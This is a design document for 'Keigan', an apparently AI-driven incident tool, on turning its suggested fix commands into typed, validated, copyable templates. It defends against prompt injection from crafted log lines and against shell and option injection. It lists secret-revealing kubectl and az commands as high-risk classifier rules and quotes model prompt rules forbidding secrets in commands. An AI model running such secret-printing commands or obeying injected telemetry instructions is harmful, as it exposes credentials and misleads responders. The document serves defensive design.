# 33 — Better suggested fixes: exact, copyable, checkable steps

Roadmap item **E1** (doc 21, product research, section 3.5, wave E). Written 2026-11-22 against branch `keigan-ui-ux`.

---

## 1. Purpose, status and how to use this document

**Purpose.** Make every fix step Keigan suggests something an on-call engineer can act on at 3 a.m. without rewriting it: one exact command or configuration change (kubectl, Azure CLI, Helm, a shell or PowerShell command, a configuration edit), a step that checks it worked, a step that undoes it, a risk rating for each, and a clear mark on everything Keigan assumed rather than knew. Keigan only suggests. People copy the step and run it in their own tools, under their own access and change process.

**Status.** Design, written 2026-11-22; not built. Every statement about existing code was checked in the source on 2026-11-22 and carries a `path:symbol` reference. Line numbers are avoided on purpose.

**How to use it.**
- Owner: read sections 2, 4.1, 5.1 and 11.
- Implementer: build the phases in section 9 in order. Section 4 is the design (schema, validation, rendering, prompts, API, settings), section 5 the screens, section 6 the safety rules, section 7 the acceptance criteria, section 8 the tests.
- Related documents: doc 06 (AI engine and prompt safety: section 3.4 hypotheses, 3.5 synthesis, 5.2 controls 7 and 8, 6 masking), doc 22 (AI evaluation harness; section 4.8 of this document adds a fix-quality metric family to it), doc 23 (Ask Keigan; the `get_investigation` tool returns the "how to fix" text), doc 21 (sections 3.2, 3.5 E1 and E2, 4.0).

**Glossary.**

| Term | Meaning |
|---|---|
| Fix step | One numbered thing to do: an **action**, a **check** (validate) and an **undo** (revert), with one risk rating per part. |
| Command template | The command the model wrote, with every resource-specific value replaced by a named slot `{{name}}`. |
| Parameter | The value for one slot: its kind (for example `kubernetes_name`), its value or none, and where the value came from. |
| Rendering | The final command text for one shell dialect (`bash` or `powershell`), built by Keigan's code from the template and the parameters. |
| Withheld | Keigan refuses to show a command as copyable (the step's description stays) because it failed a safety rule. Section 6.1 lists the reasons. |
| Assumed value | A value Keigan could not trace to the service catalogue, the cited evidence, a runbook or the knowledge given to the model. It is shown, highlighted, with the reason. |
| Missing value | A slot with no usable value (unknown, masked, or refused as unsafe). The person types it before the command can be copied. |
| Fix plan | The ordered steps the synthesis recommends for the whole investigation, picked from the three hypotheses' steps. |

---

## 2. Goals, non-goals, anti-goals

### 2.1 Goals
1. **G1. Exact.** Each state-changing step is one copyable command or one configuration change that uses real names from the service catalogue, with no hand-editing needed except values Keigan honestly cannot know.
2. **G2. Checkable and undoable.** Every mitigating step has a validate step (often re-running the evidence query that showed the problem) and, when it changes state, a revert step. Each part has its own risk rating.
3. **G3. Honest about assumptions.** A value Keigan could not trace to a source is highlighted as assumed. A value it does not have is a fill-in field, never a guess and never a placeholder that the shell would misread.
4. **G4. Safe to paste.** Values taken from telemetry cannot break out of their slot (no shell injection), commands never contain secrets, and a destructive command never appears without a warning and a way back.
5. **G5. One source of truth for every channel.** The RCA screen, the hypotheses cards, the email to technical roles, the Teams room and Ask Keigan all show the same validated steps, rendered by code.
6. **G6. Scorable.** The structure lets the evaluation harness (doc 22) score fix quality deterministically (section 4.8).

### 2.2 Non-goals
- **No execution of any kind** (roadmap E2, parked). No "run" button, no API that runs a command, no integration with a pipeline or runbook automation. AC-28 checks that no such route exists.
- No validation of commands written in free text by Ask Keigan answers (doc 23). Those answers are prose with citations; they keep today's rules. Listed in section 11.
- No new command families beyond those in `command_risk_rules.yaml` plus `sql` (read-only). KQL appears only as "re-run the evidence query" (section 4.2.4).
- No per-step "this worked" feedback in v1 (open question Q3).
- No tracking of who copied what (open question Q2).

### 2.3 Anti-goals (what would make this harmful) and their controls

| Harm | Control | Checked by |
|---|---|---|
| A pasted command does something other than it shows, because a value from a log line carried `;`, `$(...)`, a quote or a leading `-` | Typed parameters with a pattern per kind, whole-token slots, quoting by code, literal-template shape check (6.2, 6.3) | AC-4 to AC-7 |
| A destructive command looks routine | Risk computed by code (never lowered below the classifier), warning text written by code, high risk without a revert is withheld, copy of a high-risk command asks for confirmation | AC-8, AC-9, AC-21 |
| A secret ends up in a command, an email or Teams | Secret patterns refuse the command; secret-like setting names refuse the configuration change; commands that print secrets are rated high with a warning | AC-10, AC-11, AC-16 |
| An invented resource name looks real | Every value is checked against its claimed source; anything unproven is highlighted "assumed" with the reason | AC-12, AC-13 |
| A placeholder such as `<resource-group>` is pasted unfilled | Missing values are input fields; copy stays disabled until they are filled; `<` and `>` are refused in templates | AC-6, AC-20 |
| False confidence: a polished command for a wrong cause | Steps stay under the hypothesis and confidence they belong to; "Diagnose" steps come first; the RCA card says "Keigan suggests; you decide and run" | AC-17, browser check |

---

## 3. Current state (verified) and unknowns

### 3.1 How fixes are produced today
- **Schema.** `backend/keigan/ai/investigation_ai_schemas.py:ProposedFix` has `summary`, `steps: list[FixStep]`, `code_changes: list[CodeChange]`, `verification_steps: list[str]`, `rollback_steps: list[str]`. `FixStep` is `description`, `command_text` (free text, "a copyable command ... using real resource names, or null") and `command_language` (free text: "bash | powershell | sql | kql | text"; not validated). `HypothesisResult.fix_risk_level` is `low|medium|high`, default `medium`.
- **Prompt.** `backend/keigan/resources/prompts/_hypothesis_body.md` (shared by `hypothesis_application`, `hypothesis_dependencies`, `hypothesis_infrastructure`, all version 3) asks for "ordered steps (each with an optional copyable command: kubectl, az, SQL) ... verification steps and rollback steps", says to mark high risk "for anything destructive", and **instructs the model to write a placeholder such as `<resource-group>`** when a name is unknown.
- **Validation.** `backend/keigan/ai/investigation_graph.py:InvestigationGraphRunner._validated_hypothesis` strips invisible characters from each command, classifies it with `ai/command_risk_classifier.py:classify_command_risk`, stores the result as `command_risk_level`, and raises `fix_risk_level` to the highest command risk. Descriptions, verification and rollback texts are cleaned (`_clean_ai_text`: invalid citations removed, markdown sanitised). Code-change paths go through `ai/prompt_safety.py:restrict_to_known_file_path`. Nothing checks where a value in a command came from, nothing refuses a command, and verification and rollback steps are free text with no command and no risk.
- **Synthesis.** `resources/prompts/rca_synthesis.md` (version 3) asks for `how_to_fix_markdown`: "ordered steps ... Put commands in fenced code blocks using real resource names. Flag high risk steps explicitly." The model writes these commands afresh, so they bypass the per-step classification. `InvestigationGraphRunner._flag_high_risk_commands` appends a "High risk" note after a fenced block only when the classifier says high; medium is not marked. When synthesis fails, `how_to_fix_markdown` falls back to the best hypothesis's fix summary.
- **Storage.** `entities/incident_entities.py:InvestigationHypothesis.proposed_fix_json` (JSON) and `fix_risk_level`; `Investigation.how_to_fix_markdown` (Text).
- **Mock oracle.** `ai/investigation_mock_responses.py` builds fixes with `--resource-group <resource-group>` when a resource group is unknown, and `command_language="bash"` everywhere.

### 3.2 How fixes are shown today
- **Hypotheses tab.** `frontend/src/features/investigations/components/HypothesesSection.tsx:HypothesisCard` shows the fix summary, numbered steps with a `CommandBlock` (copy button, risk pill), a "high-risk command" line, code changes (before and after), and the verification and rollback steps as **plain bullet lists** (not copyable, no risk).
- **RCA tab.** `RcaSection.tsx` shows `howToFixMarkdown` with `MarkdownView` in the "How to fix" card (description "suggest only"). No per-step copy or risk.
- **CommandBlock.** `frontend/src/components/ui/CommandBlock.tsx` already supports tabs per variant (`CommandVariant[]`), a copy button (`CopyButton`), a risk pill and wrapping. It has no highlighted ranges and no fill-in fields.
- **Email.** `services/notification_service.py:NotificationService.investigation_email_body` adds `how_to_fix_markdown` only for `TECHNICAL_ROLES`. `services/notification_renderer.py:markdown_to_safe_html` supports headings, bullets, bold, inline code and links, **not fenced code blocks**. Run on 2026-11-22: a fenced block renders as `<p><code>`</code>bash</p>`, then the command as an ordinary paragraph.
- **Teams.** The preliminary-report card (`resources/templates/teams/preliminary_report.json.j2`) carries only the executive summary. `services/teams_chat_service.py:TeamsChatService._fallback_answer` posts `how_to_fix_markdown` into the incident chat when the chat agent has no answer.
- **Other readers of `how_to_fix_markdown`:** `communication_service.py` (postmortem prompt input), `investigation_chat_service.py` (Teams bot context and status answers), `ask_keigan_investigation_context.py` (digest) and `ask_keigan_investigation_tools.py` (`get_investigation` output).

### 3.3 Problems found while verifying (beyond doc 21)
1. **Unsafe placeholders.** In bash, `--resource-group <resource-group> --slot staging` parses as "read input from a file named `resource-group`, write output to a file named `--slot`" (an unfilled paste can create or truncate a file); at the end of a line it is a syntax error. In PowerShell `<` is a reserved operator. The prompt and the mock both produce this form.
2. **Commands that print secrets are rated low.** Run on 2026-11-22: `classify_command_risk("az keyvault secret show --vault-name v --name n")` and `classify_command_risk("kubectl get secret db -o yaml")` both return `low`.
3. **Telemetry values are not contained.** Evidence is masked and spotlighted for the model, but a value the model copies from a log line into a command (a pod name, a host) is not checked. A crafted log line could steer a command whose risk the classifier would then rate, but which would still be shown as copyable.
4. **The RCA card's commands are a second, unchecked set**, written by the synthesis model in markdown.
5. **The email loses command formatting** (3.2).
6. **Verification and rollback are not commands** and carry no risk, so "revert" can itself be destructive without warning (for example `helm rollback`, rated high in `command_risk_rules.yaml`).

What doc 21 section 3.2 says ("every hypothesis fix carries steps, a command risk rating, verification steps and rollback steps, and the investigation screen shows them") is accurate; it does not mention points 1 to 6.

### 3.4 Unknowns
- Whether every provider's structured output handles the deeper nested schema of section 4.3 reliably. The gateway retries once on validation failure (`llm_gateway.py`, doc 06 section 1); measured only by the harness (A1, not built).
- Which shell MetLife's responders use by default (open question Q1). The design renders both.
- Whether Teams renders fenced code blocks in bot messages in every client (desktop, web, mobile). The email path is fixed by code; Teams is checked manually (section 8.4).

---

## 4. Design

### 4.1 Decisions (made while the owner was away, revisit if wrong)

| # | Decision | Reason | Rejected alternative |
|---|---|---|---|
| F1 | **The model writes templates with typed slots; Keigan's code renders the final command.** | Only code can guarantee that a value cannot change the command's meaning. It also lets Keigan render bash and PowerShell from one template and mark each value's source. | Let the model write full commands and scan them afterwards. A scan cannot tell a malicious value from a legitimate argument. |
| F2 | **Every slot holds one whole shell word.** A value that needs quotes may not be glued to literal text (`deployment/{{name}}` is allowed only when the value needs no quotes). | Quoting rules for a partial word differ between bash and PowerShell. A whole-word rule is simple and identical in both. | Quote inside words. Error-prone in PowerShell's argument mode. |
| F3 | **One command per step.** No `;`, `&&`, `||`, `&`, redirects, command substitution or newlines in a template. A pipe is allowed only into a read-only program. | Each command gets its own risk, validate and revert; chained commands hide risk. | Allow chains and classify the worst part. The classifier already does that, but the copy button would still copy the dangerous half. |
| F4 | **A missing value is a fill-in field in the UI, not a placeholder in the text.** Copy is disabled until it is filled. Channels that cannot take input (email, Teams) say "Open in Keigan to fill in N values" instead of showing the command. | Removes the `<resource-group>` hazard (3.3, point 1) completely. | Fail-safe shell variables (`"${RESOURCE_GROUP:?}"`). That works in bash only; the PowerShell equivalent is unreadable. |
| F5 | **High risk without a revert step is withheld.** Medium risk without a revert step is shown with a "no way back given" warning. | Matches the brief: never a destructive command without a revert and a warning. | Show everything with a warning. Too easy to ignore at 3 a.m. |
| F6 | **Data-changing SQL is never a copyable command.** SQL is allowed only when the classifier rates it low (reads). A data change is described as a manual action for a database administrator. | Insurance data; a mistaken `UPDATE` cannot be reverted by a revert step. | Allow with high risk. The revert would be "restore from backup", which is not a revert. |
| F7 | **The synthesis no longer writes commands.** It writes a short overview and picks and orders steps from the three hypotheses. `how_to_fix_markdown` is rendered by code from those steps. | One checked set of steps for every channel (G5). | Validate the synthesis's markdown commands. Parsing commands out of markdown is fragile and duplicates the work. |
| F8 | **Configuration changes have a code-written command** (from a catalogue) and a revert derived from the before-value. | The revert of "set X to 5" is "set X back to its old value"; code can write that exactly. | Ask the model for the revert. It can get the old value wrong. |
| F9 | **No schema migration of old rows.** A `schema_version` inside the JSON tells the API which shape it is; old rows keep today's display. | Old investigations stay readable; nothing is rewritten. | Convert old rows. Their commands were never slot-based, so a conversion would invent structure. |
| F10 | **Risk can only go up from what the model said.** Step risk = the highest of the model's rating, the classifier on every rendering, the secret-printing rule and the configuration target's minimum. | The model may understate risk; it must never lower code's rating. | Trust the model. |

### 4.2 Data model

#### 4.2.1 Enumerations (`backend/keigan/entities/status_values.py`)
These describe JSON content, not columns, but live with the other fixed sets so the frontend types and tests share one source.

| Enum | Values |
|---|---|
| `FixStepPurpose` | `diagnose`, `mitigate`, `durable_fix` |
| `FixActionKind` | `command`, `configuration_change`, `manual_action`, `rerun_evidence_query` |
| `FixCommandTool` | `kubectl`, `az`, `helm`, `powershell`, `shell`, `sql` |
| `ShellDialect` | `bash`, `powershell` |
| `FixValueSource` | `service_catalogue`, `evidence`, `runbook`, `knowledge`, `unknown` |
| `FixValueStatus` | `verified`, `assumed`, `missing`, `masked`, `refused` |
| `ConfigurationTargetKind` | `app_setting`, `kubernetes_environment_variable`, `helm_value`, `file` |
| `FixWithheldReason` | `destructive_without_revert`, `unsafe_shell_syntax`, `unknown_slot`, `secret_in_command`, `data_changing_sql`, `value_not_insertable`, `command_too_long`, `secret_setting_name`, `unknown_evidence_code` |
| `FixWarning` | `no_revert`, `no_validation`, `prints_secrets`, `restarts_service`, `contains_assumptions`, `validation_changes_state`, `revert_is_high_risk` |

#### 4.2.2 Parameter kinds (`backend/keigan/resources/catalogs/fix_parameter_kinds.yaml`, new)
One entry per kind: `pattern` (a regular expression that both Python `re` and JavaScript accept: ASCII classes, anchors, bounded repeats only), `maximum_length`, `label_key` (i18n key). **Every pattern excludes** whitespace at the ends, `'`, `"`, `` ` ``, the curly quotes U+2018 to U+201B and U+201C to U+201F (PowerShell treats them as quotes), `$`, `;`, `&`, `|`, `<`, `>`, backslash and control characters, and **no value may start with `-`** (checked in code as well, against option injection). Starting set:

| Kind | Pattern (summary) | Example |
|---|---|---|
| `kubernetes_name` | DNS-1123 subdomain, `[a-z0-9]([-a-z0-9.]*[a-z0-9])?`, at most 253 | `claims-api-7d9f8` |
| `kubernetes_namespace` | DNS-1123 label, at most 63 | `claims-prod` |
| `azure_resource_group` | `[A-Za-z0-9._()-]{1,90}`, not ending with `.` | `rg-claims-jp-prod` |
| `azure_resource_name` | `[A-Za-z0-9][A-Za-z0-9._-]{0,259}` | `claims-func-jp` |
| `azure_resource_id` | `/subscriptions/<guid>/resourceGroups/<group>/providers/...` | |
| `azure_subscription_id` | GUID | |
| `helm_release` | as `kubernetes_name`, at most 53 | `claims-api` |
| `integer` | `[0-9]{1,9}` | `3` (a revision, a replica count) |
| `duration` | `[0-9]{1,6}(ms|s|m|h)` | `5m` |
| `configuration_key` | `[A-Za-z_][A-Za-z0-9_.:-]{0,199}` | `Database__MaxPoolSize` |
| `configuration_value` | printable ASCII without the excluded characters, spaces allowed inside, at most 500 | `true`, `200` |
| `hostname` | RFC 1123 host name | `api.partner.example` |

A **bare-safe** pattern `^[A-Za-z0-9][A-Za-z0-9._/:=@+-]*$` (in the same file) decides when a value needs no quotes. Otherwise the renderer wraps it in single quotes, which is correct in both bash and PowerShell because the kind patterns exclude every quote character.

#### 4.2.3 Configuration command catalogue (`resources/catalogs/fix_configuration_commands.yaml`, new)
For each `ConfigurationTargetKind` and service type: the read command (to record the current value), the set command, the minimum risk and warnings. Example entries:

| Target | Service type | Set template | Minimum risk | Warning |
|---|---|---|---|---|
| `app_setting` | `app_service` | `az webapp config appsettings set --name {{service}} --resource-group {{resource_group}} --settings {{setting}}={{value}}` | medium | `restarts_service` |
| `app_setting` | `functions` | `az functionapp config appsettings set ...` (same slots) | medium | `restarts_service` |
| `kubernetes_environment_variable` | `aks` | `kubectl set env deployment/{{deployment}} -n {{namespace}} {{setting}}={{value}}` | medium | `restarts_service` |
| `helm_value`, `file` | any | no command: shown as a before and after edit of the named key or file | medium | — |

`{{setting}}={{value}}` is the one allowed glued pair: both kinds are bare-safe or the value is refused for insertion (`value_not_insertable`), so the change is shown as a manual edit instead.

#### 4.2.4 What the model writes (`ai/investigation_ai_schemas.py`; replaces `FixStep` and `ProposedFix`)
```python
class FixParameterOutput(BaseModel):
    name: str                       # lower_snake_case, matches a {{name}} slot
    value_kind: FixParameterKindName  # Literal of the kinds in fix_parameter_kinds.yaml (generated list, checked by a test)
    value: str | None               # None when not known
    value_source: FixValueSource
    source_code: str | None = None  # E#, R# or K# the value was read from; required for evidence, runbook, knowledge

class FixCommandOutput(BaseModel):
    tool: FixCommandTool
    dialect: Literal["any", "bash", "powershell"] = "any"   # "any": the same command works in both (az, kubectl, helm)
    template: str                   # one command, one line, {{slots}}
    parameters: list[FixParameterOutput] = Field(default_factory=list)

class ConfigurationChangeOutput(BaseModel):
    target_kind: ConfigurationTargetKind
    service_name: str               # from the service catalogue
    setting_name: FixParameterOutput
    before_value: FixParameterOutput | None = None
    after_value: FixParameterOutput
    file_path: str | None = None    # target_kind "file" only; restricted like CodeChange.file_path

class FixActionOutput(BaseModel):
    action_kind: FixActionKind
    description: str
    command: FixCommandOutput | None = None
    configuration_change: ConfigurationChangeOutput | None = None
    evidence_code: str | None = None   # rerun_evidence_query: the E# whose stored query is re-run
    expected_result: str = ""          # what the person should see when it worked

class FixStepOutput(BaseModel):
    title: str
    purpose: FixStepPurpose
    action: FixActionOutput
    validate: FixActionOutput | None = None
    revert: FixActionOutput | None = None
    risk_level: RiskLevelName
    assumptions: list[str] = Field(default_factory=list)

class ProposedFix(BaseModel):
    summary: str
    steps: list[FixStepOutput] = Field(default_factory=list)   # trimmed to SUGGESTED_FIX_MAXIMUM_STEPS by code
    code_changes: list[CodeChange] = Field(default_factory=list)   # unchanged
```
`HypothesisResult.fix_risk_level` stays and is recomputed by code (F10).

Synthesis (`RcaSynthesisResult`): `how_to_fix_markdown` is **removed from the model's output** and replaced by:
```python
class FixStepReference(BaseModel):
    perspective: AnalysisPerspectiveName
    step_number: int = Field(ge=1)

fix_overview_markdown: str                    # 2 to 5 sentences: what to do first and why, cites [E#]/[R#]/[K#], no commands
recommended_fix_steps: list[FixStepReference]  # ordered; at most SUGGESTED_FIX_PLAN_MAXIMUM_STEPS
```

#### 4.2.5 What is stored
- `InvestigationHypothesis.proposed_fix_json` holds the **validated** fix (section 4.4), snake_case, with `"schema_version": 2`. Rows without the key are version 1 (today's shape) and are never rewritten (F9).
- **New column** `Investigation.fix_plan_json` (JSON, nullable): `{"schema_version": 2, "overview_markdown": "...", "step_references": [{"perspective": "application", "step_id": "application-2"}]}`. Step references point at stored steps; nothing is duplicated.
- `Investigation.how_to_fix_markdown` stays, now **written by code** (`fix_plan_markdown.py`, 4.5.6) from the plan, so every existing reader keeps working.
- No retention change: these live and die with the investigation (`incident_retention.py:purge_expired_incidents`).

Stored step shape (one element of `steps`):
```json
{"step_id": "application-2", "title": "...", "purpose": "mitigate", "risk_level": "medium",
 "risk_reasons": ["model:medium", "classifier:medium", "configuration:restarts_service"],
 "warnings": ["restarts_service"], "assumptions": ["..."], "has_assumed_values": false, "missing_value_count": 1,
 "action":   {"action_kind": "command", "description": "...", "expected_result": "...", "risk_level": "medium",
              "command": {"tool": "az", "template": "...", "withheld_reason": null,
                          "parameters": [{"name": "resource_group", "value_kind": "azure_resource_group", "value": null,
                                          "value_source": "unknown", "source_code": null, "status": "missing", "status_reason": "not_in_catalogue"}],
                          "renderings": [{"dialect": "bash", "text": null, "risk_level": "medium",
                                          "segments": [{"kind": "literal", "text": "az webapp restart --name "},
                                                       {"kind": "value", "text": "claims-web-jp", "parameter_name": "service"},
                                                       {"kind": "literal", "text": " --resource-group "},
                                                       {"kind": "missing_value", "parameter_name": "resource_group"}]}]},
              "configuration_change": null, "evidence_code": null},
 "validate": {"action_kind": "rerun_evidence_query", "evidence_code": "E3", "expected_result": "No rows after 10 minutes", "risk_level": "low"},
 "revert":   null}
```
`text` is null while a value is missing; segments of kind `assumed_value` mark highlighted values.

#### 4.2.6 Alembic revision plan
One revision `<new id>_investigation_fix_plan` (down revision: the head at build time, `b8d4f2a6c0e3` today): add `investigation.fix_plan_json` (JSON, nullable, `NVARCHAR(MAX)` with the repository's JSON check on Azure SQL). No backfill. Then regenerate `database/azure_sql/` scripts 01 to 06, add `database/azure_sql/migrations/<id>_investigation_fix_plan.sql`, regenerate the demo SQL and the ER diagram (`backend/scripts/generate_entity_relationship_diagram.py`).

### 4.3 Prompts
- **`_hypothesis_body.md`**: the hypothesis prompts move to the next version (4). The "Proposed fix" paragraph is replaced by these rules (summary of the text to write):
  1. Order: diagnose steps (read-only) first, then the least risky mitigation, then the durable fix. At most `{{ maximum_fix_steps }}` steps (trusted variable from settings).
  2. Each step has one action. A command is **one line, one command**; no `;`, `&&`, `||`, redirects, `$(...)`, backticks; a pipe only into a reading tool such as `grep` or `Select-String`.
  3. Every value that names a resource or comes from data goes in a slot `{{name}}` with a parameter. Give `value_kind`, the value, `value_source` and the code you read it from (`E#`, `R#`, `K#`). Use `service_catalogue` only for names in "Application and services". If you do not know a value, set it to null and `value_source` to `unknown`. **Never write a placeholder such as `<resource-group>` or `<pod-name>` in a template.**
  4. Personal data appears as placeholders such as `<EMAIL_1>`. Never put one in a value; use null.
  5. Never put a password, key, token, connection string or any secret in a command or a setting value; if a secret must change, describe it as a manual action using Key Vault.
  6. Every step that changes something has `validate` (prefer `rerun_evidence_query` with the `E#` that showed the problem, and say what result means fixed) and `revert`. If nothing needs undoing (for example a pod the controller recreates), the revert is a `manual_action` that says why.
  7. Configuration changes use `configuration_change` with the before-value when the evidence or knowledge shows it; otherwise null.
  8. SQL only to read. A data change is a `manual_action` for a database administrator.
  9. `risk_level` per step; high for anything destructive, broad or hard to undo. Keigan computes risk too and never lowers yours.
  10. List in `assumptions` what you assumed and could not verify.
- **`rca_synthesis.md`** → version 4: replace the `how_to_fix_markdown` bullet with `fix_overview_markdown` (2 to 5 sentences, citations, **no commands**) and `recommended_fix_steps` (pick from the analysts' numbered steps, in the order a responder should take them, diagnose first; at most `{{ maximum_plan_steps }}`). To make this possible, the "Hypotheses from the three analysts" section (built in `synthesis_node`) lists each hypothesis's steps as `step N (purpose, risk): title` instead of only the fix summary.
- **Injection handling** is unchanged in kind: the evidence, knowledge, runbooks and notes stay spotlighted untrusted sections (doc 06, 5.2). What is new is that the output is distrusted structurally: values are checked against their sources and patterns (4.4), so an injected instruction that reaches a command cannot change its shape.
- `test_prompt_library.py:test_every_prompt_renders_with_the_variables_the_code_passes` gains the two new trusted variables.

### 4.4 Validation pipeline (per step, in code)
`ai/fix_step_validator.py:validate_fix_step(step, context) -> dict` where `context` carries the service catalogue view, the evidence rows (by code), the runbook matches, the knowledge text given to the model, the valid citation codes and the settings. In order:
1. **Clean texts** (title, description, expected result, assumptions) with `_clean_ai_text` / `sanitize_ai_line` as today.
2. **Slots.** Parse `{{name}}` slots. A slot without a parameter → command withheld `unknown_slot`. A parameter without a slot is dropped.
3. **Shape** (`ai/fix_command_shape.py`, 6.2). Failure → withheld `unsafe_shell_syntax`. Length over `SUGGESTED_FIX_MAXIMUM_COMMAND_CHARACTERS` → `command_too_long`.
4. **Each value** (`ai/fix_parameter_kinds.py`):
   - matches a masking placeholder (`<EMAIL_n>`, `<IP_n>`, `<SECRET>` and the rest of `pii_patterns.yaml`'s placeholders) → status `masked`, value cleared;
   - fails its kind's pattern or starts with `-` → `refused` (reason recorded; the value is **not** shown, because it may be the attack), value cleared;
   - otherwise checked against its source: `service_catalogue` → exact match (case-sensitive) with a name, namespace, resource group or resource id of the application's catalogue; `evidence` → the code is a valid evidence code of this investigation and the value appears literally in that row's stored title, summary or condensed pattern templates; `runbook` / `knowledge` → appears literally in the matched runbook's steps or the knowledge text given to the model. Match → `verified`; no match → `assumed` (kept, highlighted, reason "not found in E3"); `unknown` with a value → `assumed`; null → `missing`.
5. **Secrets.** Run `PiiMasker`'s secret categories (bearer, API key, connection string, JWT, private key) over the template and every value; a hit → withheld `secret_in_command`. A configuration `setting_name` matching the secret-name list in `fix_parameter_kinds.yaml` (`password`, `secret`, `token`, `connectionstring`, `apikey`, `accountkey`, `sas`) → `secret_setting_name`.
6. **Render** (`ai/fix_command_renderer.py`) for `bash` and `powershell` (or the one declared dialect): segments as in 4.2.5; a value that is not bare-safe and is glued to literal text → withheld `value_not_insertable`.
7. **Risk.** `classify_command_risk` on each rendering with missing values replaced by a neutral token `VALUE`; plus the new `secret_revealing_commands` rules in `command_risk_rules.yaml` (`kubectl get secret(s)` with `-o yaml|json|jsonpath`, `az keyvault secret show|download`, `az storage account keys list`, `az webapp|functionapp config appsettings list`, `az aks get-credentials --admin`) → high with warning `prints_secrets`; plus the configuration target's minimum; plus the model's rating. The highest wins (F10). The same is done for validate and revert.
8. **SQL.** `tool == "sql"` with any rendering above low → withheld `data_changing_sql`.
9. **Rules across parts.** Action risk high and no revert → withheld `destructive_without_revert` (description, validate and revert texts stay visible). Action risk medium and no revert → warning `no_revert`. Purpose `mitigate`/`durable_fix` and no validate → warning `no_validation`. Validate risk above low → `validation_changes_state`. Revert risk high → `revert_is_high_risk`. Any assumed value or non-empty assumptions → `contains_assumptions`.
10. **Rerun evidence query.** `evidence_code` must be a valid evidence code with a stored `query_text`; otherwise the validate step is dropped with `unknown_evidence_code` and warning `no_validation` applies.
11. **Configuration change.** `service_name` must be in the catalogue (else the whole step becomes a manual action with the change described). The set command comes from the catalogue (4.2.3) with the step's values; the revert, when the model gave none and `before_value` is verified or assumed, is the same command with the before-value (F8); when the before-value is unknown, validate gains the catalogue's read command and the revert is a manual action "set it back to the value you read first".

The graph replaces the step loop in `_validated_hypothesis` with this validator, assigns `step_id = "<perspective>-<n>"`, and sets `fix_risk_level` to the highest action risk of non-withheld steps (withheld steps count as their computed risk too, so a withheld destructive step still makes the hypothesis high).

### 4.5 Modules (one job each)

| Module | Job |
|---|---|
| `backend/keigan/ai/fix_parameter_kinds.py` | Load `fix_parameter_kinds.yaml` once; `check_value(kind, value) -> FixValueStatus, reason`; `needs_quotes(value)`; `quote(value)`. |
| `backend/keigan/ai/fix_command_shape.py` | `check_template_shape(template, tool, dialect) -> None | FixWithheldReason`, tokenising with the classifier's tokenizer (`command_risk_classifier._tokenize`, made public as `tokenize_command`), the read-only list and the PowerShell read-only prefixes from `command_risk_rules.yaml`. |
| `backend/keigan/ai/fix_command_renderer.py` | Template plus checked parameters to segments and text per dialect; enforces the whole-word rule. |
| `backend/keigan/ai/fix_step_validator.py` | Section 4.4; returns the stored step dict. |
| `backend/keigan/ai/fix_plan.py` | Resolve `recommended_fix_steps` against stored steps (drop invalid or withheld-only references, cap, fall back to the leading hypothesis's steps when none remain or synthesis failed); build `fix_plan_json`. |
| `backend/keigan/ai/fix_plan_markdown.py` | Render `how_to_fix_markdown` from the plan: overview, then numbered steps with purpose and risk, fenced command (default dialect `SUGGESTED_FIX_DEFAULT_SHELL_DIALECT`), code-written warning lines (English; it feeds English-only consumers today), "Open Keigan to fill in N values" for steps with missing values, "Withheld: reason" for withheld commands, then validate and revert. |
| `backend/keigan/services/notification_renderer.py:markdown_to_safe_html` | Gains fenced code blocks: lines between fences are escaped and wrapped in one `<pre style="..."><code>...</code></pre>`; no inline formatting inside. |
| `backend/keigan/dtos/investigation_dtos.py` | `ProposedFixDto` gains `schema_version` and v2 fields (`steps` as `FixStepDto` v2); v1 rows are mapped to the v1 fields as today. New `FixPlanDto` on `InvestigationDetailDto`. |
| `backend/keigan/ai/investigation_mock_responses.py` | The oracle emits v2 fixes for every scenario, with slots and `null` for unknown resource groups, and a v2 synthesis with `recommended_fix_steps`. |

### 4.6 API
No new endpoint. `GET /api/investigations/{investigation_id}` (`controllers/investigation_controller.py`, reader of the application) changes shape:
- `hypotheses[].proposedFix`: `{ schemaVersion: 1 | 2, summary, steps, codeChanges, verificationSteps?, rollbackSteps? }`. For v2, `steps[]` is the stored step in camelCase. For each `missing_value` segment the DTO adds `valuePattern`, `barePattern`, `maximumLength` and `labelKey` from the kind catalogue, so the browser checks typed input with the same rules.
- New `fixPlan: { overviewMarkdown, steps: FixStep[] } | null`: the plan's steps resolved (each with `stepId` and `perspective`). Null for v1 investigations and evidence-only runs.
- `howToFixMarkdown` stays (code-rendered).
Errors: unchanged (404, 403 per doc 05).

### 4.7 Settings (`backend/keigan/config/settings.py`, `backend/.env.example`, Helm `backendEnvironment`)

| Name | Default | Range | Meaning |
|---|---|---|---|
| `SUGGESTED_FIX_MAXIMUM_STEPS` | 6 | 1 to 12 | Steps kept per hypothesis (extra steps are dropped in order); rendered into the hypothesis prompt |
| `SUGGESTED_FIX_PLAN_MAXIMUM_STEPS` | 8 | 1 to 20 | Steps in the investigation's fix plan; rendered into the synthesis prompt |
| `SUGGESTED_FIX_MAXIMUM_COMMAND_CHARACTERS` | 600 | 80 to 4000 | Longest rendered command; longer is withheld |
| `SUGGESTED_FIX_MAXIMUM_PARAMETERS_PER_COMMAND` | 8 | 1 to 20 | More parameters than this → the command is withheld (`unsafe_shell_syntax`) |
| `SUGGESTED_FIX_DEFAULT_SHELL_DIALECT` | `bash` | `bash`, `powershell` | First tab in the UI before a person picks one, and the dialect in email, Teams and `how_to_fix_markdown` |

`tests/unit/config/test_settings.py` (ranges) and the deployment-settings test (as `test_ask_keigan_deployment_settings.py` does for Ask Keigan) check that each is in `.env.example` and the Helm values with the same default.

### 4.8 How the evaluation harness will score fixes (adds to doc 22)
Doc 22 leaves fix quality out of v1 (its section 9). E1 makes it cheap to add as a metric family of the `investigations` suite, computed per trial on the persisted plan and, where named, on raw output:

| Metric | Source | Direction | Gate (proposed) |
|---|---|---|---|
| `fix_plan_step_count`, `copyable_step_share` (steps with a non-withheld command or configuration change) | persisted | report | — |
| `withheld_command_count` by reason | persisted | lower | report |
| `destructive_without_revert_count` (raw steps rated high with no revert) | raw | lower | report; persisted is 0 by construction |
| `missing_validation_count` (mitigate or durable fix steps without validate) | persisted | lower | ≤ baseline |
| `assumed_value_share`, `missing_value_share` | persisted | lower | report |
| `risk_understated_count` (model rating below computed rating) | raw vs persisted | lower | report |
| `refused_value_count` | persisted | lower | report |
| `invented_catalogue_value_count` (values claimed `service_catalogue` that are not in the world's catalogue) | raw | lower | 0 |
| `fix_targets_truth_component` (a plan step's parameters name a truth component service) | persisted + truth | higher | report |
